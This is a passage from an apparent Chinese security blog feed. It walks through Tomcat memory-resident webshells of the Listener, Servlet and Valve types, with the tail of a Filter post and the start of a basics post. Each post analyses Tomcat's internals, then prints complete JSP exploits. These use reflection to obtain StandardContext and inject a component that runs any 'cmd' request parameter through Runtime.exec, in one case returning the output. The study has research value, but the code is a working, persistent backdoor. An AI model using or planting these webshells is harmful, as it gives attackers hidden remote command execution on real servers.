        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern(&quot;/*&quot;);
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
        filterConfigs.put(name, filterConfig);
        out.print(&quot;Inject Success !&quot;);
    }
%&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;filter&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    Hello Filter
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819200853.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Tomcat内存马:Listener型</title><link>https://f4miti0n.github.io/posts/listener%E5%9E%8B/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/listener%E5%9E%8B/</guid><pubDate>Sat, 19 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;前情提要&lt;/h3&gt;
&lt;p&gt;看Listerner型内存马之前先给自己纠正一个误区，之前一直以为Listener是在Filter之后执行的，也是看了别的师傅的博客才纠正过来，属于是软工白学了。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819202048.png&quot; alt=&quot;&quot; /&gt;
Listener的监听对象可以分为以下三种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ServletContext，服务器启动和终止时触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Session，有关Session操作时触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Request，访问服务时触发
最好监听的显然是&lt;code&gt;Request&lt;/code&gt;，随便访问一个路径就能触发，我们的注入对象也肯定是选择Request的监听器，在注入之前，我们有以下两个概念需要了解下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;EventListener&lt;/code&gt;
所有类型的监听器对象都必须实现的接口，因为这里我们的注入对象选的是Request型的，所以这里我们要重点关注它的 &lt;code&gt;ServletRequestListener&lt;/code&gt; 子接口 （光看名字都知道这个和request有关吧）
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819205608.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ServletRequestListener&lt;/code&gt;
能够看出Request的监听器接口一共就两个方法需要我们实现，&lt;code&gt;requestInitialized()&lt;/code&gt;和&lt;code&gt;requestDestroyed()&lt;/code&gt; ，光看名字也能知道他们的具体执行顺序，也不多说了，直接准备一下监听器部分的代码
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819205715.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ListenerDemo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
import javax.servlet.annotation.WebListener;  
  
@WebListener(&quot;/listenerTest&quot;)  
public class ListenerDemo implements ServletRequestListener {  
    public ListenerDemo(){  
    }  
    @Override  
    public void requestDestroyed(ServletRequestEvent sre) {  
        System.out.println(&quot;Listener#requestDestroyed 被调用&quot;);  
    }  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
        System.out.println(&quot;Listener#requestInitialized 被调用&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;web.xml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;listener&amp;gt;  
    &amp;lt;listener-class&amp;gt;org.example.ListenerDemo&amp;lt;/listener-class&amp;gt;  
&amp;lt;/listener&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;随便访问个路径得到以下结果，证明监听器设置完毕，我们在&lt;code&gt;requestInitialized&lt;/code&gt;设个断点看一下调用栈，能够看出来监听器这里依然是由&lt;code&gt;standardContext&lt;/code&gt;管理的，我们跟进一下&lt;code&gt;StandardContext#fireRequestInitEvent()&lt;/code&gt;这里
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819220245.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819221550.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;能够看到这里是在5983行对我们的监听器进行了调用，5980行对监听器进行了赋值
。这里的这个&lt;code&gt;instance&lt;/code&gt; 肯定就是我们的溯源重点了，往前翻一下&lt;code&gt;instance&lt;/code&gt;的赋值流程，发现了一个重量级方法&lt;code&gt;getApplicationEventListeners()&lt;/code&gt;，跟进一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819222034.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819222349.png&quot; alt=&quot;&quot; /&gt;
出来的结果如下，到这一步我们基本就有一个具体的思路了，只要给&lt;code&gt;StandardContext&lt;/code&gt;的&lt;code&gt;applicationEventListenersList&lt;/code&gt;加一个我们自己构造的&lt;code&gt;Listener&lt;/code&gt;对象即可。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819222718.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Exp构造&lt;/h3&gt;
&lt;p&gt;很简单的啦，套一套之前的Filter型模板就有啦&lt;/p&gt;
&lt;h4&gt;StandardContext对象获取&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;//获取ApplicationContextFacade类
ServletContext servletContext = request.getSession().getServletContext();
//反射获取ApplicationContextFacade类属性context为ApplicationContext类
Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
//反射获取ApplicationContext类属性context为StandardContext类
Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;恶意Listener&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%
public class Shell_Listener implements ServletRequestListener {
	public void requestInitialized(ServletRequestEvent sre) {
		HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
		String cmd = request.getParameter(&quot;cmd&quot;);
		if (cmd != null) {
			try {
				Runtime.getRuntime().exec(cmd);
			} catch (IOException e) {
				e.printStackTrace();
			} catch (NullPointerException n) {
				n.printStackTrace();
			}
		}
	}
	public void requestDestroyed(ServletRequestEvent sre) {
	}
}
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;给StandardContext添加Listener&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%
	Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;完整Exp&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;java.util.List&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;java.util.Arrays&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;java.util.ArrayList&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;java.io.InputStream&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&amp;gt;  
&amp;lt;%!  
  
    class ListenerMemShell implements ServletRequestListener {  
  
        @Override  
        public void requestInitialized(ServletRequestEvent sre) {  
            String cmd;  
            try {  
                cmd = sre.getServletRequest().getParameter(&quot;cmd&quot;);  
                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  
                Field requestField = Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;).getDeclaredField(&quot;request&quot;);  
                requestField.setAccessible(true);  
                Request request = (Request) requestField.get(requestFacade);  
                Response response = request.getResponse();  
  
                if (cmd != null){  
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
                    int i = 0;  
                    byte[] bytes = new byte[1024];  
                    while ((i=inputStream.read(bytes)) != -1){  
                        response.getWriter().write(new String(bytes,0,i));  
                        response.getWriter().write(&quot;\r\n&quot;);  
                    }  
                }            }catch (Exception e){  
                e.printStackTrace();  
            }  
        }  
        @Override  
        public void requestDestroyed(ServletRequestEvent sre) {  
        }    }%&amp;gt;  
  
&amp;lt;%  
    //获取ApplicationContextFacade类  
    ServletContext servletContext = request.getSession().getServletContext();  
    //反射获取ApplicationContextFacade类属性context为ApplicationContext类  
    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);  
    appContextField.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);  
    //反射获取ApplicationContext类属性context为StandardContext类  
    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  
    standardContextField.setAccessible(true);  
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);  
  
  
    Object[] objects = standardContext.getApplicationEventListeners();  
    List&amp;lt;Object&amp;gt; listeners = Arrays.asList(objects);  
    List&amp;lt;Object&amp;gt; arrayList = new ArrayList(listeners);  
    arrayList.add(new ListenerMemShell());  
    standardContext.setApplicationEventListeners(arrayList.toArray());  
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行结果如下，总体来说比Filter型的简单很多嗷
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230819224614.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Tomcat内存马:Servlet型</title><link>https://f4miti0n.github.io/posts/servlet%E5%9E%8B/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/servlet%E5%9E%8B/</guid><pubDate>Sat, 19 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;流程分析&lt;/h3&gt;
&lt;p&gt;众所周知在Tomcat进行初始化的时候，三大组件遵循:Listener -&amp;gt; Filter -&amp;gt; Servlet 的加载顺序。调用栈大体如下，这里就不带着分析了，是在StandardContext#startInternal里面按顺序加载的。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820003132.png&quot; alt=&quot;&quot; /&gt;
我们直接来到栈顶的 &lt;code&gt;StandardContext#configureContext()&lt;/code&gt; 这里。这个方法里面通过对web.xml进行解析，按照顺序把filterMaps，filterDef，StandardWrapper这样的对象给创建了出来，我们这里重点关注一下StandardWrapper这一部分。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;private void configureContext(WebXml webxml) {
        // As far as possible, process in alphabetical order so it is easy to
        // check everything is present
        // Some validation depends on correct public ID
        context.setPublicId(webxml.getPublicId());
...   //设置StandardContext参数
        for (ServletDef servlet : webxml.getServlets().values()) {
            //创建StandardWrapper对象
            Wrapper wrapper = context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                //设置LoadOnStartup属性
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
            //设置ServletName属性
            wrapper.setName(servlet.getServletName());
            Map&amp;lt;String,String&amp;gt; params = servlet.getParameterMap();
            for (Entry&amp;lt;String, String&amp;gt; entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set&amp;lt;SecurityRoleRef&amp;gt; roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
            //设置ServletClass属性
            wrapper.setServletClass(servlet.getServletClass());
            ...
            wrapper.setOverridable(servlet.isOverridable());
            //将包装好的StandWrapper添加进ContainerBase的children属性中
            context.addChild(wrapper);
           for (Entry&amp;lt;String, String&amp;gt; entry :
                webxml.getServletMappings().entrySet()) {
            //添加路径映射
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        }
        ...
    }
    //上面这段加注释的都是搬运参考的，确实写的很好嗷
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这段代码里，configureContext成功把StandWrapper创建了出来，并添加到了context.children里面。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Q34N%60%28%40L~R%29R9%5BSIRSTW%5D%5B5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;创建完了之后，&lt;code&gt;fireLifecycleEvent&lt;/code&gt;基本就是个出栈的过程了。我们回到&lt;code&gt;StandardContext&lt;/code&gt;这里，继续跟进一下剩下的&lt;code&gt;StandardWrapper&lt;/code&gt;加载流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820005012.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820005838.png&quot; alt=&quot;&quot; /&gt;
把前置条件都准备好了，我们来到loadOnstartup这里，也就是加载Servlet的部分这里，由于loadOnStartUp这里比较重要，我们直接粘贴出来，就不截图了。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820010106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  public boolean loadOnStartup(Container children[]) {
        // Collect &quot;load on startup&quot; servlets that need to be initialized
        TreeMap&amp;lt;Integer, ArrayList&amp;lt;Wrapper&amp;gt;&amp;gt; map = new TreeMap&amp;lt;&amp;gt;();
        for (Container child : children) {
            Wrapper wrapper = (Wrapper) child;
            int loadOnStartup = wrapper.getLoadOnStartup();
            //判断loadOnStartup的值，如果小于零直接不加载
            if (loadOnStartup &amp;lt; 0) {
                continue;
            }
            Integer key = Integer.valueOf(loadOnStartup);
            ArrayList&amp;lt;Wrapper&amp;gt; list = map.get(key);
            if (list == null) {
                list = new ArrayList&amp;lt;&amp;gt;();
                map.put(key, list);
            }
            list.add(wrapper);
        }
        // Load the collected &quot;load on startup&quot; servlets
        for (ArrayList&amp;lt;Wrapper&amp;gt; list : map.values()) {
            for (Wrapper wrapper : list) {
                try {
                    wrapper.load();
                }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;引用一下其他师傅给这里的分析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;注意这里对于Wrapper对象中`loadOnStartup`属性的值进行判断，只有大于0的才会被放入list进行后续的`wrapper.load()`加载调用。

这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过`loadOnStartup`属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到这里为止Servlet的加载流程基本就结束了，正式来到Exp编写环节&lt;/p&gt;
&lt;h3&gt;Exp编写（引用）&lt;/h3&gt;
&lt;p&gt;通过上文的分析我们能够总结出创建Servlet的流程
1.获取StandardContext对象
2.编写恶意Servlet
3.通过StandardContext.createWrapper()创建StandardWrapper对象
4.设置StandardWrapper对象的loadOnStartup属性值
5.设置StandardWrapper对象的ServletName属性值
6.设置StandardWrapper对象的ServletClass属性值
7.将StandardWrapper对象添加进StandardContext对象的children属性中
8.通过StandardContext.addServletMappingDecoded()添加对应的路径映射&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;java.io.IOException&quot; %&amp;gt;  
&amp;lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&amp;gt;  
&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;  
  
&amp;lt;%  
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);  
    reqF.setAccessible(true);  
    Request req = (Request) reqF.get(request);  
    StandardContext standardContext = (StandardContext) req.getContext();  
%&amp;gt;  
  
&amp;lt;%!  
  
    public class Shell_Servlet implements Servlet {  
        @Override  
        public void init(ServletConfig config) throws ServletException {  
        }        @Override  
        public ServletConfig getServletConfig() {  
            return null;  
        }  
        @Override  
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {  
            String cmd = req.getParameter(&quot;cmd&quot;);  
            if (cmd !=null){  
                try{  
                    Runtime.getRuntime().exec(cmd);  
                }catch (IOException e){  
                    e.printStackTrace();  
                }catch (NullPointerException n){  
                    n.printStackTrace();  
                }  
            }        }        @Override  
        public String getServletInfo() {  
            return null;  
        }  
        @Override  
        public void destroy() {  
        }    }  
%&amp;gt;  
  
&amp;lt;%  
    Shell_Servlet shell_servlet = new Shell_Servlet();  
    String name = shell_servlet.getClass().getSimpleName();  
  
    Wrapper wrapper = standardContext.createWrapper();  
    wrapper.setLoadOnStartup(1);  
    wrapper.setName(name);  
    wrapper.setServlet(shell_servlet);  
    wrapper.setServletClass(shell_servlet.getClass().getName());  
%&amp;gt;  
  
&amp;lt;%  
    standardContext.addChild(wrapper);  
    standardContext.addServletMappingDecoded(&quot;/servletshell&quot;,name);  
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820011751.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Tomcat内存马:Valve型</title><link>https://f4miti0n.github.io/posts/valve%E5%9E%8B/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/valve%E5%9E%8B/</guid><pubDate>Sat, 19 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;前言&lt;/h3&gt;
&lt;p&gt;这一块的关键点还在tomcat的管道机制上，前面在基本知识那里已经写过了，就不多赘述了
基本就是一个Context -&amp;gt; Pipeline -&amp;gt; Valve 的层次顺序。
我们来看一下几个接口的源码吧，先看看Valve接口的源码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.apache.catalina;  
import java.io.IOException;  
import javax.servlet.ServletException;  
import org.apache.catalina.connector.Request;  
import org.apache.catalina.connector.Response;  

 public interface Valve {  
	public Valve getNext();  
	public void setNext(Valve valve);  
	public void backgroundProcess();  
	public void invoke(Request request, Response response)  
	throws IOException, ServletException;  
	public boolean isAsyncSupported();  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从&lt;code&gt;getNext()&lt;/code&gt;指向下一个Valve，我们能够看出来Valve并不是我们想象的那样，是存在Pipline的一个数组元素，而是一个类似于链表的机制。&lt;code&gt;invoke&lt;/code&gt; 方法这里是具体操作的实现方法，我们的恶意代码后面就是插在这里的，我们再看一下Pipline接口的源码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public interface Pipeline extends Contained {  
	public void setBasic(Valve valve);  
	public void addValve(Valve valve);  
    public Valve[] getValves();  
    public void removeValve(Valve valve);  
    public Valve getFirst();  
    public boolean isAsyncSupported();  
    public void findNonAsyncValves(Set&amp;lt;String&amp;gt; result);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;能够看出这里提供了很多关于Vavle操作的方法，我们后面重点关注一下&lt;code&gt;addValve()&lt;/code&gt;这个方法，毕竟我们还得靠它来把恶意的Valve给绑到Pipeline上。&lt;/p&gt;
&lt;h3&gt;流程分析&lt;/h3&gt;
&lt;p&gt;因为这个管道机制是发生在处理请求的时候嘛，我们直接在Servlet随便加个断点往前回溯即可跟踪流程，这里看一下调用栈，跟到第一个invoke调用前地方。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820144902.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820145022.png&quot; alt=&quot;&quot; /&gt;
该部分代码如下，从当前管道的第一个invoke开始链式调用，如果当前的valve已经是当前管道的最后一个valve则调用下一层管道的第一个valve循环往复，直到最后一层管道的最后一个valve被调用，下面随便附上几张图。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820145105.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820150050.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820150142.png&quot; alt=&quot;&quot; /&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820150122.png&quot; alt=&quot;&quot; /&gt;
到这一步，我们的构造思路就已经非常显然了，只要随便把我们的恶意valve插到以上的任意一个管道里面即可。&lt;/p&gt;
&lt;h3&gt;Exp编写&lt;/h3&gt;
&lt;h4&gt;恶意Valve&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;class ValveShell extends ValveBase{  
    @Override  
 public void invoke(Request request, Response response) throws IOException, ServletException {  
        System.out.println(&quot;111&quot;);  
 try {  
            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));  
 } catch (Exception e) {  
        }  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;获取Pipeline对象&lt;/h4&gt;
&lt;p&gt;和前文尽量保持思路一致吧，只要能获得到StandardContext就能获得到Pipeline，所以怎么都好说。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//获取ApplicationContextFacade类
ServletContext servletContext = request.getSession().getServletContext();
//反射获取ApplicationContextFacade类属性context为ApplicationContext类
Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
//反射获取ApplicationContext类属性context为StandardContext类
Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
Pipeline pipeline = standardContext.getPipeline();
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;添加进Pipline&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Shell_Valve shell_valve = new Shell_Valve();
pipeline.addValve(shell_valve);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;完整Exp&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&amp;gt;
&amp;lt;%@ page import=&quot;java.io.IOException&quot; %&amp;gt;
&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;
 
&amp;lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
 
    Pipeline pipeline = standardContext.getPipeline();
%&amp;gt;
 
&amp;lt;%!
    class Shell_Valve extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter(&quot;cmd&quot;);
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
%&amp;gt;
 
&amp;lt;%
    Shell_Valve shell_valve = new Shell_Valve();
    pipeline.addValve(shell_valve);
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Pasted%20image%2020230820151411.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Tomcat内存马:基本知识</title><link>https://f4miti0n.github.io/posts/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</guid><pubDate>Sat, 19 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Tomcat架构浅析&lt;/h3&gt;
&lt;p&gt;基本架构如图所示，咱们主要把关注点放在&lt;code&gt;Connector&lt;/code&gt;和&lt;code&gt;Container&lt;/code&gt;这两个组件这里。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/TomcatStage.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Connector&lt;/code&gt; 组件 ，相当于tomcat的外交大臣，把浏览器传来的字节流封装处理成&lt;code&gt;ServletRequest&lt;/code&gt; 对象，之后再把&lt;code&gt;ServletRequest&lt;/code&gt; 对象 转发给&lt;code&gt;Contaniner&lt;/code&gt;组件处理。当&lt;code&gt;Container&lt;/code&gt; 组件处理完毕之后，&lt;code&gt;Contaniner&lt;/code&gt; 组件会给&lt;code&gt;Connector&lt;/code&gt;组件返回一个 &lt;code&gt;ServletResponse&lt;/code&gt;对象，该对象再反过来经由&lt;code&gt;Connector&lt;/code&gt;组件一系列处理，还原成字节流，最终把返回结果转发给浏览器，让浏览器进行页面渲染。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;过程挺简单的，但显然不是今天的重点，我们内存马主要还是依靠这里的&lt;code&gt;Container&lt;/code&gt;组件来实现的，所以我们再跟进分析一下&lt;code&gt;Container&lt;/code&gt;组件的运行机制，大体如下图所示。
（&lt;code&gt;Container&lt;/code&gt; 组件又称 &lt;code&gt;Catalina&lt;/code&gt;，下文存在一定的混用，别混淆了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/20220218104446.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里面从Engine到Wrapper涉及到了几个细分概念，我们先不急着解释，可以先从我下面偷的
